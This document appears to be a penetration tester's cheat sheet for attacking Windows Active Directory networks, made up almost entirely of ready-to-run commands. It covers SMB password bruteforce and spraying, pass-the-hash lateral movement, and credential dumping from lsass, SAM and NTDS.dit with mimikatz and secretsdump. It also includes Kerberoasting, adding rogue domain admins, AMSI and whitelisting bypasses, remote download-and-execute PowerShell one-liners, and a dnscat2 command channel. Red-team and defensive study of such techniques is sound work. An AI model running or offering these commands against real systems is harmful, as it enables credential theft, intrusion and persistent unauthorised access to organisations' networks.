`hydra -L users.txt -p Password1 -m 'D' 172.20.11.55 smbnt -V`

### Bruteforce using net use

`@FOR /F %n in (users.txt) DO @FOR /F %p in (pass.txt) DO @net use \\DOMAINCONTROLLER\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\DOMAINCONTROLLER\IPC$ > NUL`


### all systems

`net view /domain > systems.txt`

### Local admin search using net use

`@FOR /F %s in (systems.txt) DO @net use \\%s\C$ /user:domain\username  
Password 1>NUL 2>&1 && @echo %s>>admin_access.txt && @net use 
/delete \\%s\C$ > NUL`

### Domain joined machine

`Invoke-DomainPasswordSpray -Password Spring2017`

## Non-domain joined testing

When you have an initial set of compromised creds run these from a Virtual Machine to place foothold on network as domain user.

### Shell with domain user privileges
`C:\runas.exe /netonly /user:BLAHDOMAIN\blahuser cmd.exe`

`runas /netonly /user:blah@blah.com "mmc %SystemRoot%\system32\dsa.msc`

Make sure you use the FQDN of the domain and set the reg key as below.

### check dc: 
`nltest /dsgetdc:domain.local`

To change DC via registry to point at domain being tested:

HKEY_LOCAL_MACHINE
SYSTEM
CurrentControlSet
Services
Netlogon
Parameters
“SiteName“ > DC1.domain.com

### Create session for use with dumpsec
`net use \\10.0.0.1\ipc$ /user:domain.local\username password`

### Quick User lists and password policy enum

`net users /domain`

`net group /domain "Domain Admins"`

`net accounts /domain`

Note that the above commands do not work with runas. Below PowerView functions will work with runas.

### Powerview:

`. .\PowerView.ps1`

`Get-UserProperty -Properties samaccountname`

`Get-NetGroupMember`

`Get-DomainPolicy`

Search shares and files using Invoke-FileFinder and Invoke-ShareFinder

## Domain Analysis

### BloodHound

Run locally on non-domain joined machine (remember to add target domain to registry):

``..\BloodHound.ps1``

``Invoke-BloodHound``

### SharpHound

`SharpHound.exe --CollectionMethod All`

### Run from remote shell

Useful when you have a remote shell.

`powershell Set-ExecutionPolicy RemoteSigned`

`powershell -command "& { . C:\BloodHound.ps1; Invoke-BloodHound }"`

### Run from web server or over Internet:

Use this when you cannot copy BloodHound.ps1 over to target.

`powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'); Invoke-BloodHound"`

### Run using Sharppick - AMSI bypass

SharpPick.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"

`SharpPick-64.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"`

### Goddi (fast dump all domain info)

`.\godditest-windows-amd64.exe -username=testuser -password="testpass!" -domain="test.local" -dc="dc.test.local" -unsafe`

### ADRecon (More detailed - Good for AD Auditing)

https://github.com/sense-of-security/ADRecon

### Share and file finder
`Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 20 | 
Out-File -Encoding Ascii interesting-shares.txt`

`Invoke-FileFinder -ShareList .\interesting-shares.txt -Verbose -Threads 
20 -OutFile juicy_files.csv`

### Eyewitness
docker run --rm -it -v /tmp/blah:/tmp/EyeWitness eyewitness --web --single https://www.google.com

### Windows priv esc

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

## Compromise and Lateral Movement

### Crackmapexec

`crackmapexec smb 172.16.110.0/24`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -x 'ipconfig'`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --pass-pol`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 -M mimikatz`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --sam`

`crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --lsa`

### Winexe to boxes (not opsec safe) - service is run. No cleanup.

`pth-winexe //10.0.0.1 -U DOMAIN/zdefense/blahuser%blahpassword cmd`

`pth-winexe //10.0.0.1 -U DOMAIN/zdefense/blahuser%hash cmd`

### Impacket psexec.py to boxes (not opsec safe) - does cleanup after but leaves logs after installing and running service.

`psexec.py user@IP`

`psexec.py user@IP -hashes ntlm:hash`

### Impacket wmiexec.py (opsec safe - unless WMI logging is enabled)

`wmiexec.py domain/user@IP`

`wmiexec.py domain/user@IP -hashes ntlm:hash`

### Impacket smbclient (probably opsec safe as its just using SMB)

`python smbclient.py domain/blahuser@10.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:blah`

## RDP Pass the Hash
Using mimikatz:

`privilege::debug`
`sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"`

If disabled:

`sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:powershell.exe`
`Enter-PSSession -Computer <Target>`
`New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`

## Invoke the hash 

`Invoke-WMIExec -Target blah -Username blah -Hash NTLMHASH -Command blah`

## Password dumping

### From Live Kali on a workstation
`samdump2 SYSTEM SAM > hashes.txt`

### Local

`C:\> reg.exe save hklm\sam c:\temp\sam.save`

`C:\> reg.exe save hklm\security c:\temp\security.save`

`C:\> reg.exe save hklm\system c:\temp\system.save`

`secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

`pwdump system sam`

### In Memory
`C:\> procdump.exe -accepteula -ma lsass.exe c:\lsass.dmp 2>&1`

`C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit`

`C:\>mini.exe`

https://github.com/b4rtik/ATPMiniDump

### From box

`mimikatz # privilege::debug`
`mimikatz # sekurlsa::logonPasswords full`

### Remote

`impacket-secretsdump Administrator@ip`
`impacket-secretsdump Administrator@ip -hashes ntlm:hash`

### Domain 

To find where NTDS is run the below:

`reg.exe query hklm\system\currentcontrolset\services\ntds\parameters`

### vssadmin

`C:\vssadmin list shadows`

`C:\vssadmin create shadow /for=C:`

`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .`

`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .`

`copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .`

`secretsdump.py -system system.save -ntds ntds.dit local -just-dc-ntlm`

remove machine accounts

`grep -a -F ':::' hashes.txt | grep -av '$:' > finalhashes.txt`

only passwords for pipal

`cut -f 3 -d ':' cracked_with_users_enabled.txt`

`vssadmin delete shadows /shadow={cd534584-a272-44ab-81e1-ab3f5fbe9b29}`

godumpsecrets for faster

### ntdsutil

```
C:\>ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\pentest
ifm: quit
ntdsutil: quit
```

`ntdsutil`

`ntdsutil: snapshot`

`ntdsutil: list all`

`ntdsutil: create`

`snapshot: mount 1`

Cleanup snapshots:

`snapshot: list all`

`snapshot: unmount 1`

`snapshot: list all`

`snapshot: delete 1`

## Post Compromise (Not opsec safe)
Add user to local admin and domain admin

### Add Domain Admin
`net user username password /ADD /DOMAIN`

`net group "Domain Admins" username /ADD /DOMAIN`

### Add Local Admin
`net user username password /ADD`

`net localgroup Administrators username /ADD`


### Tasklist scraper to find logged in admins

If powershell not enabled or unable to run BloodHound this script will find admins.

`#!/bin/sh`

`for ip in $(cat ip.txt);do`

`pth-winexe -U Admin%hash //$ip "ipconfig"`

`pth-winexe -U Admin%hash //$ip "tasklist /v"`

`done`

### Kerberoasting

`Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`

https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1

Invoke-AutoKerberoast

`python autoKirbi2hashcat.py ticketfilefromautoinvokekerberoast`

`IEX (New-Object Net.WebClient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast`

### Hashcat Alienware - kerbtgt hash cracking

`sudo apt-get install nvidia-367`

`sudo nvidia-smi`

`reboot`

`sudo hashcat -I`

`hashcat -m 13100 kerb.txt ~/Downloads/realuniq.lst` 

### LAPS - GetLAPSPasswords

https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1

## Priv Esc
### Powerup

`IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks`

## File Transfer

### SMB Server in Kali

`python smbserver.py test /root/tools`

### Python Web Server

`python -m SimpleHTTPServer <port>`

## Domain Fronting

https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
https://signal.org/blog/doodles-stickers-censorship/
https://www.securityartwork.es/2017/01/24/camouflage-at-encryption-layer-domain-fronting/
https://trac.torproject.org/projects/tor/wiki/doc/meek
http://bryceboe.com/2012/03/12/bypassing-gogos-inflight-internet-authentication/

## AWL bypasses

### Powershell without powershell.exe

`SharpPick.exe -d "http://zdefense/blah.ps1"`

### Squiblytwo 

`wmic.exe os get /format:"http://zdefense/foo.xsl"`

### Sharpshooter

https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/

`python SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile ./output/payload.bin --smuggle --template mcafee --com xslremote --awlurl http://ZDefense/foo.xsl`

### cypher queries

user to which box the user has localadmin

`MATCH (u:User)-[r:MemberOf|:AdminTo*1..]->(c:Computer) return u.name, collect(c.name)`

List of DAs
`Match p=(u:User)-[:MemberOf]->(g:Group) WHERE g.name= "DOMAIN ADMINS@ZDefense" return u.displayname`

    https://downloads.skullsecurity.org/dnscat2/
    https://github.com/lukebaggett/dnscat2-powershell
    $ dnscat –host <dnscat server_ip>
